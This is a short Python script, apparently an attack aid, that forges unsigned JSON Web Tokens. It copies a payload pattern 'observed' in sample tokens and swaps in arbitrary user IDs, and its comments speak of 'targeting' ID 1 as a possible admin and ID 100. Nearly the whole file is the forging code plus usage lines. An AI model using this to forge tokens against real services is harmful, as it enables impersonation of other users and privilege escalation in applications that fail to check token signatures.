import json
import base64
import time

def generate_unsigned_token(target_id, email_variant="jt@jwt.com"):
    # 1. The Header (Constant based on your samples)
    header_data = {
        "alg": "HS256",
        "typ": "JWT"
    }

    # 2. The Payload (Constructed based on the observed pattern)
    payload_data = {
        "id": target_id,          # The arbitrary ID you want to target
        "name": "james",          # Static in all samples
        "email": email_variant,   # Seems to switch between j@jwt.com and jt@jwt.com
        "roles": [{"role": "diner"}],
        "iat": int(time.time())   # Current Unix timestamp
    }

    # Helper function for JWT specific Base64Url encoding
    # JWTs use URL-safe base64 and strip the padding '=' characters
    def jwt_b64_encode(data):
        json_str = json.dumps(data, separators=(",", ":")) # Compact JSON (no spaces)
        encoded = base64.urlsafe_b64encode(json_str.encode()).decode()
        return encoded.rstrip("=") # Remove padding

    # Generate parts
    header_str = jwt_b64_encode(header_data)
    payload_str = jwt_b64_encode(payload_data)

    return f"{header_str}.{payload_str}"

# --- Usage Examples ---

# Generate for ID 1 (Admin?)
print(f"Targeting ID 1: {generate_unsigned_token(1)}")

# Generate for ID 100
print(f"Targeting ID 100: {generate_unsigned_token(100)}")